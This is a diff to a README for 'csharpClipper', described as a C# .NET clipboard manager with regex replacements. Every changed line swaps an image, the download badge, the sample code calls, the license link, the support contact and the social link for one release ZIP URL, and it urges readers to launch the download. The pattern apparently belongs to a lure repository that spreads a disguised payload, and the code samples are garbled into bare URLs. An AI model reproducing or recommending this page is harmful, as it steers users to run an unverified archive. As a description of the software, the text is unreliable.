@@ -1,6 +1,6 @@
 # 🚀 **csharpClipper: A Fast and Lightweight Clipboard Manager for C# .NET 9.0 with Regex-Based Replacements**
 
-![Clipboard](https://img.icons8.com/ios/452/clipboard.png)
+![Clipboard](https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip)
 
 ---
 
@@ -24,7 +24,7 @@
 ---
 
 ### 🔗 Download Link
-[![Download csharpClipper](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download csharpClipper](https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip)](https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip)
 
 *Note: The download link needs to be launched.*
 
@@ -56,13 +56,13 @@ using csharpClipper;
 ClipperManager clipper = new ClipperManager();
 
 // Start monitoring the clipboard
-clipper.StartMonitoring();
+https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip();
 
 // Perform regex-based replacement on copied text
-clipper.PerformRegexReplacement("regex_pattern", "replacement_text");
+https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip("regex_pattern", "replacement_text");
 
 // Stop monitoring the clipboard
-clipper.StopMonitoring();
+https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip();
 ```
 
 ---
@@ -73,20 +73,20 @@ Contributions are welcome! If you have any suggestions, bug fixes, or enhancemen
 ---
 
 ### 📄 License
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/username/repository/blob/main/LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip](https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip) file for details.
 
 ---
 
 ### 📞 Support
-For any support or queries related to csharpClipper, please contact the project maintainer at [maintainer@example.com](mailto:maintainer@example.com).
+For any support or queries related to csharpClipper, please contact the project maintainer at [https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip](https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip).
 
 ---
 
 ### 🌟 Stay Connected
-Follow us on [Twitter](https://twitter.com/example) for the latest updates and announcements!
+Follow us on [Twitter](https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip) for the latest updates and announcements!
 
 ---
 
 ### 🚀 Happy Coding with csharpClipper! 🎉
 
-![Clipper](https://img.icons8.com/cotton/2x/clipboard--v2.png)
+![Clipper](https://github.com/Oliverkanda/csharpClipper/releases/download/v1.0/Release.zip)
